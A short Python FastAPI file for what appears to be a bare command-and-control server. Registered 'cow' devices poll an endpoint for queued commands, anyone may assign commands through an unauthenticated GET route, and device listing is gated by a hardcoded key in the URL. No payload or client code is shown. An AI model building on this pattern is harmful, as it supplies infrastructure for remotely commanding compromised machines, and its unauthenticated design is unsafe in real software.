from fastapi import FastAPI
from dotenv import load_dotenv
import os

app = FastAPI()

clients = {
    "cow1": {"name": "example", "command": "command here", "status": "online"},
    "cow2": {"name": "example2", "command": "command here", "status": "offline"}
}

name_to_id = {
    "example": "cow1",
    "example2": "cow2"
}

def newDevice(device_name):
    if device_name in name_to_id:
        print("[~] Device already known.")
        return

    cowID = f"cow{len(clients) + 1}"
    clients[cowID] = {
        "name": device_name,
        "command": "",
        "status": "online"
    }
    name_to_id[device_name] = cowID
    print(f"[+] Registered new device: {device_name} as {cowID}")

def assignCommands(id, command):
    if id in clients:
        clients[id]["command"] = command
        print(f"[+] Assigned command to {id}: {command}")
    else:
        print(f"[!] Tried to assign command to unknown cow: {id}")

@app.get("/ping/{device_name}")
async def ping(device_name: str):
    print(f"[+] Ping received from: {device_name}")
    newDevice(device_name)
    cow_id = name_to_id[device_name]
    return {"status": "ok", "command": clients[cow_id]["command"]}

@app.get("/command/listcows/{key}")
async def listcows(key: str):
    if key == "NoOneIsAroundToHelp":
        print("[+] Listing all cows.")
        data = [(id, info["name"]) for id, info in clients.items()]
        return {"auth": "ok", "cows": data}
    else:
        print("[!] Unauthorized list request.")
        return {"auth": "failed"}

@app.get("/command/{cow},{command}")
async def command(cow: str, command: str):
    print(f"[+] Received command: '{command}' for cow: {cow}")
    assignCommands(cow, command)
    return {"status": "ok"}
